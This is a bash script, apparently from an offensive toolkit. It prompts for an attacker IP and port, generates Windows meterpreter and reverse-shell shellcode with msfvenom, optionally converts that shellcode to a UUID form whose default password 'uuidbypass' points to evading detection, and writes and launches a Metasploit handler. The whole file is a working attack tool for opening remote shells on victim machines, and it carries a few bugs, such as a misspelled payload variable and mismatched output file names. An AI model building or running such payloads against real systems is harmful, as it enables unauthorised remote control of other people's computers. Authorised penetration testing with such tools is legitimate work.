#!/bin/bash

#Defualt configuration
Defualt_IP=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
Defualt_Port="4444"

#Payload list
#32 bit
PAYLOAD_HTTPS="windows/meterpreter/reverse_https"
PAYLOAD_RC4="windows/meterpreter/reverse_tcp_rc4"
PAYLOAD_SHELL="windows/shell/reverse_tcp"
PAYLOAD_SIMPLE_M="windows/meterpreter/reverse_tcp"
#64 bit
PAYLOAD_HTTPS_64="windows/x64/meterpreter/reverse_https"
PAYLOAD_RC4_64="windows/x64/meterpreter/reverse_tcp_rc4"
PAYLOAD_SHELL_64="windows/x64/shell/reverse_tcp"
PAYLOAD_SIMPLE_M_64="windows/x64/meterpreter/reverse_tcp"

#Check if root
if [[ $EUID -ne 0 ]]; then
   echo -e "\033[31mThis script must be run as root!\033[0m" 
   exit 1
fi

#Clean workspace before start working
echo -e "\033[32mCleaning your workspace...\033[0m"
SC=shellcode.bin
if test -f "$SC"; then
    rm $SC
fi
sleep 1
MP=meterpreter.rc
if test -f "$MP"; then
    rm $MP
fi


#build the shellcode
echo -e "\033[34mDefault IP:\033[1m" $Defualt_IP "\033[0m"
echo -e "\033[34mdefault Port:\033[1m" $Defualt_Port "\033[0m"
echo "Let's Build your shellcode"
echo "what is your ip address(kali ip)?"
echo -e "\033[2myou can use defaults by press \033[1menter\033[0m"

read -p "IP:" IP
if [[ -z "$IP" ]]; then
    #echo $IP
    IP=$Defualt_IP
fi
echo -e "Nice ip address:\033[1m" $IP "\033[0m"

echo "Now, what is your port that you want to listen to?"
read -p "Port:" PORT 
if [[ -z "$PORT" ]];  then
    PORT=$Defualt_Port
fi
echo -e "Nice one, My favorite!\033[1m:" $PORT "\033[0m"

PS3='Please choose your payload: '
payloads=($PAYLOAD_HTTPS $PAYLOAD_RC4 $PAYLOAD_SHELL $PAYLOAD_SIMPLE_M $PAYLOAD_HTTPS_64 $PAYLOAD_RC4_64 $PAYLOAD_SHELL_64 $PAYLOAD_SIMPLE_M_64)
select opt in "${payloads[@]}"
do
    case $opt in  
        $PAYLOAD_HTTPS)
            echo "you chose: $PAYLOAD_HTTPS"
            PAYLOAD=$PAYLOAD_HTTPS
            ARCH="x86"
            break
            ;;
        $PAYLOAD_RC4)
            echo "you chose: $PAYLOAD_RC4"
            read -p "please enter rc4 password:" RC4PASSWORD
            PAYLOAD=$PAYLOAD_RC4
            ARCH="x86"
            break
            ;;
        $PAYLOAD_SHELL)
            echo "you chose: $PAYLOAD_SHELL"
            PAYLOAD=$PAYLOAD_SHEL
            ARCH="x86"
            break
            ;;
        $PAYLOAD_SIMPLE_M)
            echo "you chose: $PAYLOAD_SIMPLE_M"
            PAYLOAD=$PAYLOAD_SIMPLE_M
            ARCH="x86"
            break
            ;;
        $PAYLOAD_HTTPS_64)
            echo "you chose: $PAYLOAD_HTTPS_64"
            PAYLOAD=$PAYLOAD_HTTPS_64
            ARCH="x64"
            break
            ;;
        $PAYLOAD_RC4_64)
            echo "you chose: $PAYLOAD_RC4_64"
            read -p "please enter rc4 password:" RC4PASSWORD
            PAYLOAD=$PAYLOAD_RC4_64
            ARCH="x64"
            break
            ;;
        $PAYLOAD_SHELL_64)
            echo "you chose: $PAYLOAD_SHELL_64"
            PAYLOAD=$PAYLOAD_SHELL_64
            ARCH="x64"
            break
            ;;
        $PAYLOAD_SIMPLE_M_64)
            echo "you chose: $PAYLOAD_SIMPLE_M_64"
            PAYLOAD=$PAYLOAD_SIMPLE_M_64
            ARCH="x64"
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done


#Genrate the shellcode
if [[ "$PAYLOAD" == "$PAYLOAD_RC4"  || $PAYLOAD == "$PAYLOAD_RC4_64" ]]; then 
    if [[ -z $RC4PASSWORD ]]; then
        RC4PASSWORD="uuidbypass"
    fi
    echo -e "\033[32mStart building your shellcode...\033[0m"
    sudo msfvenom RC4PASSWORD=$RC4PASSWORD -a $ARCH --platform windows -p $PAYLOAD LHOST=$IP LPORT=$PORT  -f python -b "x00" > shellcode.bin
    echo -e "\033[32mYour shellcode is in shellcode.bin\033[0m"
else
    echo -e "\033[32mStart building your shellcode...\033[0m"
    sudo msfvenom -a $ARCH --platform windows -p $PAYLOAD LHOST=$IP LPORT=$PORT -f python -b "x00" > shellcode.py
    echo -e "\033[32mYour shellcode is in shellcode.bin\033[0m"
fi

#Check if user wants to convert shellcode to uuid
read -r -p "Do you want to covert your shellcode to uuid structure? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
then
    echo -e "\033[32mConverting is running...\033[0m"
    sudo python3 Shellcode2UUID.py
else
    echo -e "\033[32mOk, it's fine too\033[0m"
fi

#Create automation for meterpreter shell
echo -e "\033[32mNow, Let's build your meterpreter shell automation\033[0m"
sudo touch meterpreter.rc
echo use exploit/multi/handler >> meterpreter.rc
echo set PAYLOAD $PAYLOAD >> meterpreter.rc
echo set LHOST $IP >> meterpreter.rc
echo set LPORT $PORT >> meterpreter.rc
if [[ $PAYLOAD == $PAYLOAD_RC4 || $PAYLOAD == $PAYLOAD_RC4_64 ]]; then
    echo "setting password"
    echo set RC4PASSWORD $RC4PASSWORD >> meterpreter.rc
fi
echo set ExitOnSession false >> meterpreter.rc
echo exploit -j -z >> meterpreter.rc
echo "Output:"
cat meterpreter.rc

#Check if user wants to start metasploit
read -r -p "Do you want to start metasploit? [y/N] " response
if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]
then
    sudo msfconsole -r  meterpreter.rc
else
    echo -e "\033[31mBye, Have a great time\033[0m"
    exit 1
fi